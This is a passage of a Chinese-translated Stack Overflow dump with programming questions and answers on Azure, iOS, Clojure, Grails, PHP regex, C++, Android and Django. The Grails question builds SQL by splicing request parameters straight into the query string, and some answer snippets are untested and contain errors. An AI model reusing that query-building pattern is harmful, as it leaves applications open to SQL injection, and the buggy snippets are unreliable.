> 时间：2012-09-28T20:26:03.480
> 
> 标签：asp.net, azure, azure-blob-storage, ascx

我正在尝试将用户控件 (ASCX) 存储到 Azure Blob（因为我需要经常更新它们）。

我使用 ParseControl。[但是，它不会导致诸如 PlaceHolder 之类的编译。](https://stackoverflow.com/a/7072503/296861)

**问题：**无论如何我可以从像[Page.LoadControl("MyControl.ascx");这样的 Blob 访问文件吗？](http://msdn.microsoft.com/en-us/library/t9ecy7tf.aspx)

如果没有任何效果，我的最后一个选择是写入[临时文件。](https://stackoverflow.com/a/7075187/296861)

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:34:16.850

我认为对您来说最简单的方法是创建一个自定义[VirtualPathProvider](http://msdn.microsoft.com/en-us/library/system.web.hosting.virtualpathprovider.aspx)。您可以[将此示例](http://jvshangout.wordpress.com/2012/02/17/virtualpathprovider-for-windows-azure-hosting-aspx-web-pages-in-blob-storage/)作为起点。

然后只需调用 Page.LoadControl("~/Your_Registered_Path/Control.ascx")

# objective-c - iOS 和 Objective-C：如何全局保存对象

> ID：12646948
> 
> 赞同：1
> 
> 时间：2012-09-28T20:26:12.330
> 
> 标签：objective-c, ios, global-variables, oauth-2.0

为 iOS 开发应用程序时，我需要知道如何在用户进行身份验证时创建实例化和可用的对象。

我正在使用 OAuth2 方法正确实现 gtm-oauth2 框架。用户条目会看到显示在 Web 视图中的登录表单并正确进行身份验证。在那一刻，如文档中所述，我是这样的：

```
if (error != nil){
    // Do whatever to control the error
}
else
{
    // Authentication succeeded

    // Assign the access token to the instance property for later use
    self.accessToken = myAuth.accessToken;
    [myAuth setShouldAuthorizeAllRequests:YES];
    [self setAuth:myAuth];

    // Display the access token to the user
    UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"Authorization Succeeded"
                                                        message:[NSString stringWithFormat:@"Access Token: %@", myAuth.accessToken]
                                                       delegate:self
                                              cancelButtonTitle:@"Dismiss"
                                              otherButtonTitles:nil];
    [alertView show];
} 
```

稍后，在同一个控制器中，一旦用户通过身份验证，我就会使用这样的 self.auth 对象来访问我的 API：

```
[request setURL:getCartsURL];
[request setValue:self.accessToken forHTTPHeaderField:@"Authorization"];
[self.auth authorizeRequest:request
          completionHandler:^(NSError *error) {
              NSString *output = nil;
              if (error) {
                  output = [error description];
              } else {
                  // Synchronous fetches like this are a really bad idea in Cocoa applications
                  //
                  // For a very easy async alternative, we could use GTMHTTPFetcher
                  NSURLResponse *response = nil;
                  NSData *data = [NSURLConnection sendSynchronousRequest:request
                                                       returningResponse:&response
                                                                   error:&error];

                  if (data) {
                      // API fetch succeeded
                      output = [[NSString alloc] initWithData:data
                                                     encoding:NSUTF8StringEncoding];

                      SBJsonParser *jsonParser = [SBJsonParser new];

                      // Parse the JSON into an Object
                      id parsed = [jsonParser objectWithString:output];

                      NSArray *arrayResponse = [[NSArray alloc] initWithArray:parsed];

                  } else {
                      // fetch failed
                      output = [error description];
                  }
              }
          }]; 
```

到目前为止，我一直在使用`self.auth`对象的本地实例，如果我想从整个应用程序的任何点全局访问该对象，这还不够。对于初始化视图控制器可以，但对于整个应用程序则不行。

我想我可以随时访问第一个视图控制器来获取对象。但我想我们有更好的方法让它全局实例化并从应用程序的任何点访问。

你能帮我解决这个问题吗？

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:43:13.863

您可以更改该`[self setAuth:myAuth];`ViewController 以在 AppDelegate 上设置一个对象。在那里创建并设置它，然后您就可以从任何地方访问它。

`[[UIApplication sharedApplication] delegate]`会给你一个指向你的应用程序委托的指针，它是在你创建项目时自动创建的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T21:10:01.933

您应该使用单例。[这](https://web.archive.org/web/20111228132007/http://lukeredpath.co.uk/blog/a-note-on-objective-c-singletons.html)是一篇关于如何设置的好文章。

# nsstring - 将 NSString 转换为无符号字符

> ID：12646949
> 
> 赞同：0
> 
> 时间：2012-09-28T20:26:26.783
> 
> 标签：nsstring, char, unsigned

嗨，我想将我的 nsstring 转换为 unsigned char 我尝试过使用闲置的代码行

```
unsigned char strTransforms[100] =  (unsigned char) [newTransFarString UTF8String]; 
```

但它显示错误“数组初始化程序必须是初始化程序列表”

如何将其转换为无符号字符；谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-05T03:10:59.537

您是否尝试过 NSString 方法 – getCString:maxLength:encoding: ？

# clojure - 如何从 Clojure 中的嵌套列表或向量中按类型删除项目？

> ID：12646950
> 
> 赞同：7
> 
> 时间：2012-09-28T20:26:31.523
> 
> 标签：clojure, nested-forms

如果我只想删除向量，有没有办法按类型删除嵌套列表中的项目，使得 (1 [2] 3 (4 [5] 6)) 变为 (1 3 (4 6))？

使用 postwalk，我可以用 nil 替换所有向量，但我找不到删除它们的方法。

```
(clojure.walk/postwalk 
  #(if (vector? %) nil %) '(1 [2] 3 (4 [5] 6)))

=>(1 nil 3 (4 nil 6)) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T21:21:11.353

远非完美，但也许这是一个好的开始：

```
 (clojure.walk/prewalk #(if (list? %) (remove vector? %) %) '(1 [2] 3 (4 [5] 6))) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T21:23:10.913

我很想看到一个更简洁的解决方案`clojure.walk`，但这里是一个使用递归函数的解决方案`mapcat`：

```
(defn remove-vectors [coll]
  (mapcat
     (fn [x]
       (cond
         (vector? x) nil
         (coll? x) (list (remove-vectors x))
         :else (list x)))
     coll)) 
```

还有一个使用`filter`and `map`：

```
(defn remove-vectors [coll]
  (map #(if (coll? %) (remove-vectors %) %) (remove vector? coll))) 
```

# grails - grails：将 SQL 转换为域类

> ID：12646951
> 
> 赞同：0
> 
> 时间：2012-09-28T20:26:43.323
> 
> 标签：grails, groovy

我正在开发一个 GRAILS 应用程序（我是 GRAILS 的新手，并且从以前的开发人员那里继承了该项目）。我正在慢慢掌握 GRAILS 的运行方式以及 DOMAIN 类、休眠等的使用。MySQL db 托管在 Amazon 上，我们正在使用 ElasticCache。

你们中的任何一个知识渊博的人都知道我可以如何将以下 SQL 语句转换为域类和查询条件。

```
if(params?.searchterm) {

    def searchTerms = params.searchterm.trim().split( ',' )
    def resultLimit = params.resultlimit?: 1000
    def addDomain = ''

    if (params?.domainname){
        addDomain = " and url like '%${params.domainname}%' "
    }

    def theSearchTermsSQL = ""

    /*
     *  create c.name rlike condition for each search term
     *
     */
    searchTerms.each{
        aSearchTerm -> 
            if( theSearchTermsSQL != '' ){
                theSearchTermsSQL += ' or '
            }
            theSearchTermsSQL += "cname rlike '[[:<:]]" + aSearchTerm.trim() +  "[[:>:]]'"
    }

    /*
     *  build query
     *
     */
    def getUrlsQuery = "select
        u.url as url,
        c.name as cname,
        t.weight as tweight
    from
       (category c, target t, url_meta_data u )
    where
       (" + theSearchTermsSQL + ")
    and 
        t.category_id = c.id
        and t.url_meta_data_id = u.id
        and u.ugc_flag != 1 " + addDomain + "
    order by tweight desc
    limit " + resultLimit.toLong()

    /* 
     *  run query
     *
     */
    Sql sqlInstance = new Sql( dataSource )

    def resultsList = sqlInstance.rows( getUrlsQuery )

} 
```

表格如下（虚拟数据）：

```
[Category]
id | name
-----------
 1 | small car
 2 | bike
 3 | truck
 4 | train
 5 | plane
 6 | large car
 7 | caravan

[Target]
id | cid | weight | url_meta_data_id
----------------------------------------
 1 |  1  |  56    |        1
 2 |  1  |  76    |        2
 3 |  3  |  34    |        3
 4 |  2  |  98    |        4
 5 |  1  |  11    |        5
 6 |  3  |  31    |        7
 7 |  5  |  12    |        8
 8 |  4  |  82    |        6

[url_meta_data]
id | url                          | ugc_flag
---------------------------------------------
 1 | http://www.example.com/foo/1 |    0
 2 | http://www.example.com/foo/2 |    0
 3 | http://www.example.com/foo/3 |    1
 4 | http://www.example.com/foo/4 |    0
 5 | http://www.example.com/foo/5 |    1
 6 | http://www.example.com/foo/6 |    1
 7 | http://www.example.com/foo/7 |    1
 8 | http://www.example.com/foo/8 |    0 
```

领域类

```
class Category {

    static hasMany = [targets: Target]

    static mapping = {
        cache  true
        cache usage: 'read-only'
        targetConditions cache : true
    }

    String name

    String source
}

class Target {

    static belongsTo = [urlMetaData: UrlMetaData, category: Category]
    static mapping = {
        cache true
        cache usage: 'read-only'
    }

    int weight

}

class UrlMetaData {

    String url

    String ugcFlag

    static hasMany = [targets: Target ]

    static mapping = { 
        cache true
        cache usage: 'read-only'
    }

    static transients = ['domainName']

    String getDomainName() {

        return HostnameHelper.getBaseDomain(url)
    }
} 
```

基本上，来自 url_meta_data 的 url 可以关联到许多类别。所以本质上我想要实现的*应该*是一个相对基本的操作......返回搜索词“汽车”的所有网址、它们的权重（即重要性）以及 ugc_flag 不是 1 的位置（即 url不是用户生成的内容）。数据库中有 100K + 记录，这些记录是从第三方提供商导入的。请注意，所有 URL 都属于我的客户 - 这里没有做任何狡猾的事情。

请注意我在查询中使用的 rlike - 我最初使用的是 ilike %searchterm% 但它会找到 searchterm 是较大单词一部分的类别，例如“caravan”） - 不幸的是，尽管 rlike 不会返回任何内容如果用户请求“汽车”。

我编辑了代码 - 正如 Igor 指出最初包含“域名”的奇怪内容。这是传递的可选参数，允许用户仅过滤特定域的 url（例如“example.com”）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:40:42.323

我会创建一个给定域对象的空列表，遍历结果列表，从每一行构造一个域对象并将其添加到这些对象的列表中。然后将该列表从控制器返回以查看。那是你要找的吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T19:49:15.690

1) 如果它是从头开发的 Grails 应用程序（而不是基于遗留数据库结构），那么您可能应该已经有域类`Category`, `Target`, `UrlMetaData`（否则您必须手动创建它们或使用 db-reverse-engineer 插件）

2）我假设`Target`有一个领域`Category category`并且`Category`有一个领域`UrlMetaData urlMetaData`

3）要走的路可能是[http://grails.org/doc/2.1.0/ref/Domain%20Classes/createCriteria.html](http://grails.org/doc/2.1.0/ref/Domain%20Classes/createCriteria.html)，我将尝试为您的特定案例概述基础知识

4）不确定是什么`theDomain`意思 - 可能是代码异味，以及接受`rlike`来自客户端的参数

5）以下代码根本没有经过测试 - 特别是我不确定嵌套条件内的析取如何工作。但这可能是一个合适的起点；记录 sql 查询应该有助于使其工作（[如何在 Grails 中记录 SQL 语句](https://stackoverflow.com/questions/2568507/how-to-log-sql-statements-in-grails)）

```
def c = Target.createCriteria() //create criteria on Target
def resultsList = c.list(max: resultLimit.toLong()) { //list all matched entities up to resultLimit results
    category { //nested criteria for category
        //the following 'if' statement and its body is plain Groovy code rather than part of DSL that translates to Hibernate Criteria
        if (searchTerms) { //do the following only if searchTerms list is not empty
            or { // one of several conditions
                for (st in searchTerms) { // not a part of DSL - plain Groovy loop
                    rlike('name', st.trim())) //add a disjunction element
                }
            }
        }
        urlMetaData { //nested criteria for metadata
            ne('ugcFlag', 1) //ugcFlag not equal 1
        }
    }    
    order('weight', 'desc') //order by weight
} 
```

明确编写时，限制可能`or`效果更好

```
if (searchTerms) { 
    def r = Restrictions.disjunction() 
    for (st in searchTerms) {
        r.add(new LikeExpression('name', st.trim()))
    }
    instance.add(r) //'instance' is an injected property
} 
```

干杯，
伊戈尔·西内夫

# ios - Passbook：无法在 iOS Provisioning 门户中访问 Pass Type ID

> ID：12646958
> 
> 赞同：0
> 
> 时间：2012-09-28T20:27:05.583
> 
> 标签：ios, passbook

我正在阅读教程： [http ://www.raywenderlich.com/20734/beginning-passbook-part-1](http://www.raywenderlich.com/20734/beginning-passbook-part-1)

它指示我去苹果开发网站上的 iOS 配置中心，但我找不到他们引用的*Pass Type ID*。我是苹果开发的新手，所以感谢那些有更多经验的人的建议。

* * *

我想我的问题是，我可以在没有 99 美元的 iOS 开发者帐户的情况下玩 / 测试通行证吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:30:37.140

访问 developer.apple.com。去会员中心。如果需要，请登录。转到 iOS 配置门户。在左侧，您将看到以下内容

```
-Certificates
-Devices
-App Ids
-Pass Type Ids
-... 
```

Pass Type Ids 是你想要的。

# php - 获取并用正则表达式替换引用的字符串

> ID：12646963
> 
> 赞同：0
> 
> 时间：2012-09-28T20:27:41.123
> 
> 标签：php, regex

我正在尝试在引号内获取字符串。我正在使用正则表达式，但我遇到了转义引号的问题。

例如，我有这个：

```
$var = "SELECT * FROM TABLE WHERE USERNAME='Carasuman'";
preg_match_all('~([\'"])(.*?)\1~s', $var, $result);
$new = preg_replace('~([\'"])(.*?)\1~s',"<#################>",$var); 
```

代码完美运行。我在 $result[1] 中获得了 $new 中的替换值和引用值

```
$new = "SELECT * FROM TABLE WHERE USERNAME=<#################>";
$result[1] = "Carasuman"; 
```

我的问题是当我在引号内添加一个转义引号时：

```
$var = "SELECT * FROM TABLE WHERE USERNAME='Carasuman\'s'"; 
```

我懂了：

```
$new = "SELECT * FROM TABLE WHERE USERNAME=<#################>'s";
$result[1] = "Carasuman\" //must be "Carasuman\'s"; 
```

如何避免此错误并像第一个示例一样获得 $new 和 $result[1] ？：

```
$new = "SELECT * FROM TABLE WHERE USERNAME=<#################>";
$result[1] = "Carasuman\'s"; 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T21:02:59.813

对于比赛，如果没有 \ 作为单个匹配元素，您将永远不会得到**Carasuman**，因为您可以在单个匹配中让匹配跳过字符。它要么抓住**Carasuman**要么**Carasuman**

只需使用 str_replace 来摆脱反斜杠

```
preg_match_all('~([\'"])(.*)\1~s', $var, $result);
$result[2] = str_replace('\\','',$result[2]); 
```

对于替换，？在 (.*?) 组中使其变得不贪婪，这意味着它将在第一场比赛中停止。去除那个 ？in (.*?) 使其变得贪婪，这意味着它将一直持续到最后一场比赛

```
preg_replace('~([\'"])(.*)\1~s',"<#################>",$var); 
```

**编辑**

与其在 $result[2] 上的匹配之后执行 str_replace，不如事先在初始字符串上执行，例如：

```
$var = str_replace("\\'","'",$var); 
preg_match_all('~([\'"])(.*)\1~s', $var, $result);
$new = preg_replace('~([\'"])(.*)\1~s',"<#################>",$var); 
```

You still need to make your wildcard match greedy like (.*?) to (.*) in order to have the apostrophe in the name included in the match/replace instead of being counted as the terminating single quote

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:44:58.887

你为什么不这样做：

```
$var = "SELECT * FROM TABLE WHERE USERNAME='" . mysql_real_escape_string($input) . "'"; 
```

我认为你不一定需要做正则表达式。此外， mysql_real_escape_string 正确地转义了您的输入，因此您可以拥有`$input = 'Carasuman\'s';`或`$input = "Carasuman's";`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T20:49:05.997

要匹配带引号的字符串，您可以使用正则表达式`'\'.*?(?:\\\\.[^\\\\\']*)*\''`和四个双引号字符串`'".*?(?:\\\\.[^\\\\"]*)*"'`

# boost - Boost.Build 条件变量

> ID：12646965
> 
> 赞同：0
> 
> 时间：2012-09-28T20:27:48.220
> 
> 标签：boost, boost-build, bjam

如何在 Jamfile 中设置变量，其值取决于使用的功能？

也就是说，我正在使用特征库：

```
import feature : feature ;

feature myoption : A B C : symmetric propagated ; 
```

现在我想根据值设置一个全局变量？

```
constant MY_VARIABLE : >>HERE VALUE DEPENDING ON <myoption> VALUE<< ; 
```

如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T07:20:42.583

在 Boost.Build 中，除非给出具体目标的上下文，否则表达式“<myoption> value”没有多大意义。在同一构建调用期间，可以使用不同的 <myoption> 值构建不同的具体目标。这些不同的具体目标甚至可以来自同一个元目标，但 <myoption> 仍然具有不同的值。如果您可以提供一个示例来说明您正在尝试做什么，其中包括目标并指定如何将 MY_CONSTANT 用于它们，那么也许我可以提出一个解决方案。

编辑：这是相关的常见问题条目：[如何在 Jamfile 中获取功能的当前值？](http://www.boost.org/doc/display_build.php/boost-build/boost-build/doc/html/bbv2/faq.html#bbv2.faq.featurevalue)

# objective-c - 核心数据：在循环中使用 executeFetchRequest

> ID：12646966
> 
> 赞同：1
> 
> 时间：2012-09-28T20:27:47.800
> 
> 标签：objective-c, core-data, nsfetchrequest, cs193p

关于另一篇文章中的一个[答案](https://stackoverflow.com/a/12645804/359248)`executeFetchRequest`：循环使用是一种不好的做法吗？[我在斯坦福 CS193p 项目“ Photomania](http://www.stanford.edu/class/cs193p/cgi-bin/drupal/system/files/sample_code/Photomania_0.zip) ”中看到了这种用法（点击链接下载项目）。相关代码如下：

`[FlickrFetcher recentGeoreferencedPhotos]`用于从 Flickr API 获取照片，这发生在后台线程中。但是执行获取请求的循环发生在主线程中。

```
- (void)fetchFlickrDataIntoDocument:(UIManagedDocument *)document
{
    dispatch_queue_t fetchQ = dispatch_queue_create("Flickr fetcher", NULL);
    dispatch_async(fetchQ, ^{    
        NSArray *photos = [FlickrFetcher recentGeoreferencedPhotos];
        // perform in the NSMOC's safe thread (main thread)
        [document.managedObjectContext performBlock:^{ 
            for (NSDictionary *flickrInfo in photos) {
                // This is the method that will call executeFetchRequest
                [Photo photoWithFlickrInfo:flickrInfo inManagedObjectContext:document.managedObjectContext];
            }  
            [document saveToURL:document.fileURL forSaveOperation:UIDocumentSaveForOverwriting completionHandler:NULL];
        }];
    });
    dispatch_release(fetchQ);
} 
```

这是首先尝试从上下文中获取对象的工厂方法（根据从 flickr API 获取的传入对象）。如果结果为 nil，则将该对象插入到上下文中。

```
+ (Photo *)photoWithFlickrInfo:(NSDictionary *)flickrInfo
        inManagedObjectContext:(NSManagedObjectContext *)context
{
    Photo *photo = nil;

    NSFetchRequest *request = [NSFetchRequest fetchRequestWithEntityName:@"Photo"];
    request.predicate = [NSPredicate predicateWithFormat:@"unique = %@", [flickrInfo objectForKey:FLICKR_PHOTO_ID]];
    NSSortDescriptor *sortDescriptor = [NSSortDescriptor sortDescriptorWithKey:@"title" ascending:YES];
    request.sortDescriptors = [NSArray arrayWithObject:sortDescriptor];

    NSError *error = nil;

    NSArray *matches = [context executeFetchRequest:request error:&error];

    if (!matches || ([matches count] > 1)) {
        // handle error
    } else if ([matches count] == 0) {
        photo = [NSEntityDescription insertNewObjectForEntityForName:@"Photo" inManagedObjectContext:context];
        photo.unique = [flickrInfo objectForKey:FLICKR_PHOTO_ID];
        photo.title = [flickrInfo objectForKey:FLICKR_PHOTO_TITLE]; 
        photo.subtitle = [flickrInfo valueForKeyPath:FLICKR_PHOTO_DESCRIPTION];
        photo.imageURL = [[FlickrFetcher urlForPhoto:flickrInfo format:FlickrPhotoFormatLarge] absoluteString];
        photo.whoTook = [Photographer photographerWithName:[flickrInfo objectForKey:FLICKR_PHOTO_OWNER] inManagedObjectContext:context];
    } else {
        photo = [matches lastObject];
    }

    return photo;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T13:40:33.397

我已经在您的问题中回答了[核心数据： executeFetchRequest vs performFetch](https://stackoverflow.com/questions/12645641/core-data-executefetchrequest-vs-performfetch/12645804#12645804)。

这是我写的：

> 在循环中执行请求可能会对性能产生影响，但我不会担心这一点。在引擎盖下，Core Data 维护着一种缓存机制。每次执行请求时，如果数据不在缓存中，Core Data 会在您的存储（例如 sql 文件）上执行一次往返，并用它检索到的对象填充缓存。如果执行相同的查询，由于缓存机制，往返不会再次执行。无论如何，您可以避免在运行循环中执行请求，只需将该请求移出循环即可。

在这种情况下，for 循环中的请求是可以的，因为您需要找到当前的可能匹配项`(NSDictionary *)flickrInfo`。

另一种方法，可能是将请求移到方法之外

```
+ (Photo *)photoWithFlickrInfo:(NSDictionary *)flickrInfo
        inManagedObjectContext:(NSManagedObjectContext *)context; 
```

因此，例如，修改此方法以适应以下`NSArray`结果：

```
+ (Photo *)photoWithFlickrInfo:(NSDictionary *)flickrInfo photoResults:(NSArray*)results
        inManagedObjectContext:(NSManagedObjectContext *)context; 
```

将第一段代码替换为以下内容

```
- (void)fetchFlickrDataIntoDocument:(UIManagedDocument *)document
{
    dispatch_queue_t fetchQ = dispatch_queue_create("Flickr fetcher", NULL);
    dispatch_async(fetchQ, ^{    
        NSArray *photos = [FlickrFetcher recentGeoreferencedPhotos];
        // perform in the NSMOC's safe thread (main thread)
        [document.managedObjectContext performBlock:^{          

            NSFetchRequest *request = [NSFetchRequest fetchRequestWithEntityName:@"Photo"];
            NSArray *results = [context executeFetchRequest:request error:&error];

            for (NSDictionary *flickrInfo in photos) {
                // This is the method that will call executeFetchRequest
                [Photo photoWithFlickrInfo:flickrInfo photoResult:results inManagedObjectContext:document.managedObjectContext];
            } 

            [document saveToURL:document.fileURL forSaveOperation:UIDocumentSaveForOverwriting completionHandler:NULL];
        }];
    });
    dispatch_release(fetchQ);
} 
```

在这种情况下，您可以通过请求检索所有存储的照片。（托管对象的）数组被传递给 `+(Photo*)photoWithFlickrInfo:photoResults:inManagedObjectContext:`.

现在，`+(Photo *)photoWithFlickrInfo:photoResults:inManagedObjectContext:`您需要设置一个谓词，`results`以便根据`[flickrInfo objectForKey:FLICKR_PHOTO_ID];`. 动机很简单：您已将请求移到循环之外，现在您需要检索特定的请求。因此，例如，您可以这样做：

```
+ (Photo *)photoWithFlickrInfo:(NSDictionary *)flickrInfo photoResults:(NSArray*)results
            inManagedObjectContext:(NSManagedObjectContext *)context
{
    NSPredicate *predicate = [NSPredicate predicateWithFormat:@"unique == %@", [flickrInfo objectForKey:FLICKR_PHOTO_ID]];
    NSArray* filteredPredicate = [results filterUsingPredicate:predicate];

    // now filteredPredicate is the same as matches in the second snippet of your code.

    // do the other code here..    
} 
```

*总结*

两种方法都有效。通过它们，您可以检索已创建的照片或创建新照片。

> 这就是为什么循环是不可避免的。我错了吗？

不，因为您可以尝试遵循我**的方法，但斯坦福课程中提供的方法比我发布的方法具有更好的性能。**我没有进行任何性能测试，但如果您有兴趣可以自己做，并通过 Instruments 分析结果。

*简单提示*

Standford 代码中的一个简单更改可能是在后台执行 Core Data 操作，以防止主线程被阻塞。如果您有大量数据，这种方法可能很有用。如果数据很少，请保持原样。

# c++ - std::vector::operator[] 的模糊重载

> ID：12646968
> 
> 赞同：0
> 
> 时间：2012-09-28T20:27:54.660
> 
> 标签：c++

我有一个简单的 C 空终止字符串包装器，它本质上是 std::vector< char > 的子类。（是的，我知道 std::string，但我的包装器更容易与期望 char* 的 C 函数合作。此外，std::string 不能保证在 C++03 中是连续的）

这是代码：

```
#include <cstdio>
#include <vector>

typedef std::vector<char> vector_char;
class c_string : public vector_char
{
    public:
    c_string(size_t size) : vector_char(size+1) {}

    c_string(const char* str)
    {
        if(!str) return;
        const char* iter = str;
        do
            this->push_back(*iter);
        while(*iter++);
    }

    c_string() {}

    //c_string(std::nullptr_t) {}

    char* data()
    {
        if(this->size())
            return &((*this)[0]); //line 26
        else
            return 0; 
    }

    const char* data() const { return this->data(); }

    operator char*() { return this->data(); }
    operator const char*() const { return this->data(); }

};

int main()
{
    c_string first("Hello world");
    c_string second(1024);

    printf("%s",first.data());
    printf("%c\n",first[0]);
    snprintf(second, second.size(), "%d %d %d", 5353, 22, 777);
    printf(second);
} 
```

MinGW 抱怨：

```
D:\prog\PROJEKTYCPP\hehe_testc_cpp.cpp: In member function 'char* c_string::data()':

D:\prog\PROJEKTYCPP\hehe_testc_cpp.cpp:26:22: warning: ISO C++ says that these are ambiguous, even though the worst conversion for the first is better than the worst conversion for the second: [enabled by default]

In file included from d:\prog\mingw\bin\../lib/gcc/mingw32/4.7.0/include/c++/vector:65:0,
                 from D:\prog\PROJEKTYCPP\hehe_testc_cpp.cpp:2:
d:\prog\mingw\bin\../lib/gcc/mingw32/4.7.0/include/c++/bits/stl_vector.h:768:7:note: candidate 1: std::vector<_Tp, _Alloc>::reference std::vector<_Tp, _Alloc>::operator[]:(std::vector<_Tp, _Alloc>::size_type) [with _Tp = char; _Alloc = std:
:allocator<char>; std::vector<_Tp, _Alloc>::reference = char&; std::vector<_Tp,_Alloc>::size_type = unsigned int]

D:\prog\PROJEKTYCPP\hehe_testc_cpp.cpp:26:22: note: candidate 2: operator[](char
*, int) <built-in> 
```

如何强制调用正确的重载？这个问题能默默地伤害我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:40:29.350

通过拥有一个运营商`char *`，您提供了两种方式来做`operator[]`. 第一种是`std::vector::operator[]`直接申请；第二个是转换`this`并`char*`适用`[]`于它。在这种情况下，它们都会产生相同的结果，但编译器无法知道这一点。

通过明确指定您想要的来解决它。

```
 return &(operator[](0)); //line 26 
```

或者

```
 return &((char*)(*this)[0]); //line 26 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:37:07.740

要删除第一个警告，您可以这样做：

```
char* data()
{
    if(this->size())
        return &vector_char::operator[](0);
    else
        return 0;
} 
```

要删除所有警告，请删除`operator char*()`和`operator const char*()`成员。

# android - Android：线程和其中的 NotFoundException

> ID：12646973
> 
> 赞同：0
> 
> 时间：2012-09-28T20:28:23.947
> 
> 标签：android, multithreading

我遇到了 NotFound 资源异常的问题。我确定我的资源 ID 与我设置的完全相同，但它还是失败了！这是一件有趣的事情，因为带有“findViewById(R.id.editText1)”的第一行执行得很好，我看到了标签“开始！” 在editText1中，但线程内的第二个 - 失败：

```
09-29 00:17:45.103: E/AndroidRuntime(347): android.content.res.Resources$NotFoundException: String resource ID #0x0 
```

谁能帮我解决这类问题？这是一个代码：

```
EditText editText = ( EditText ) findViewById( R.id.editText1 );
editText.setText( "start!" );

final Handler handler = new Handler();
Runnable runnable = new Runnable() {

    @Override
    public void run() {

        for (int i = 0; i <= 10; i++) {

            final int value = i;

            try {

                Thread.sleep( 1000 );

            } catch ( InterruptedException e ) {

                e.printStackTrace();

            }

           handler.post( new Runnable() {

               @Override
               public void run() {

                   EditText editText = ( EditText ) findViewById( R.id.editText1 );
                   editText.setText( value );

               }

           } );

        }

    }

};

Thread thread = new Thread( runnable );
thread.start(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:51:21.310

`value`是一个整数值。将整数传递给该`setText`方法将尝试`String`通过资源 ID 从您的 strings.xml 文件中查找一个。如果要显示数字，则需要将其解析为`String`：`Integer.toString(value)`

# python - Python：导入错误消息 - Django

> ID：12646975
> 
> 赞同：0
> 
> 时间：2012-09-28T20:28:30.700
> 
> 标签：python, django, python-import

我是 python 和 django 的新手，所以我正在运行一个代码，我收到一条错误消息：

```
File "/home/mbenchoufi/brisket/../brisket/views.py", line 11, in <module>
from influence.forms import SearchForm
ImportError: No module named forms 
```

一个非常奇怪的事情是我在影响文件夹中有一个名为 forms.py 的文件，在这个文件中我有一个名为 SearchForm 的类。

这是打印 sys.path 信息

```
['/home/mbenchoufi/brisket', '/home/mbenchoufi/src/ckanclient', '/home/mbenchoufi/src/vdm', '/home/mbenchoufi/brisket/src/mediasync', '/home/mbenchoufi/brisket/src/transparencydata', '/home/mbenchoufi/brisket/src/simplepay', '/home/mbenchoufi/brisket/src/feedinator', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-linux2', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PIL', '/usr/lib/python2.7/dist-packages/gst-0.10', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/python2.7/dist-packages/ubuntu-sso-client', '/usr/lib/python2.7/dist-packages/ubuntuone-client', '/usr/lib/python2.7/dist-packages/ubuntuone-control-panel', '/usr/lib/python2.7/dist-packages/ubuntuone-couch', '/usr/lib/python2.7/dist-packages/ubuntuone-installer', '/usr/lib/python2.7/dist-packages/ubuntuone-storage-protocol']
['/home/mbenchoufi/brisket', '/home/mbenchoufi/src/ckanclient', '/home/mbenchoufi/src/vdm', '/home/mbenchoufi/brisket/src/mediasync', '/home/mbenchoufi/brisket/src/transparencydata', '/home/mbenchoufi/brisket/src/simplepay', '/home/mbenchoufi/brisket/src/feedinator', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-linux2', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PIL', '/usr/lib/python2.7/dist-packages/gst-0.10', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/python2.7/dist-packages/ubuntu-sso-client', '/usr/lib/python2.7/dist-packages/ubuntuone-client', '/usr/lib/python2.7/dist-packages/ubuntuone-control-panel', '/usr/lib/python2.7/dist-packages/ubuntuone-couch', '/usr/lib/python2.7/dist-packages/ubuntuone-installer', '/usr/lib/python2.7/dist-packages/ubuntuone-storage-protocol'] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T15:44:06.457

您的项目结构不遵循[Django 1.4 文档](https://docs.djangoproject.com/en/dev/releases/1.4/#updated-default-project-layout-and-manage-py)。您的 manage.py 文件应该比设置和 url 高一级。请检查一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T15:44:51.433

您**必须**确保`influence`在您的 sys.path 中。

以便，`influence`就可以导入了。

并且，在文件夹`influence`中，**必须**有一个名为`__init__.py`

为使`influence`作为一个包

在您的views.py中添加以下代码

```
import sys
influence_path = FIND_OUT_INFLUENCE_PATH
sys.path.append(influence_path)

from influence_path.foo import bar
... 
```

* * *

当您在外壳中时，请执行导入。如错误所示。

您**必须**设置`DJANGO_SETTINGS_MODULE`,

* * *

如果你还是一头雾水，

在 shell 中，cd 你的项目路径，然后运行`tree`命令，

然后发布您的项目文件夹树

* * *

## 回答 #3

> 赞同：0
> 
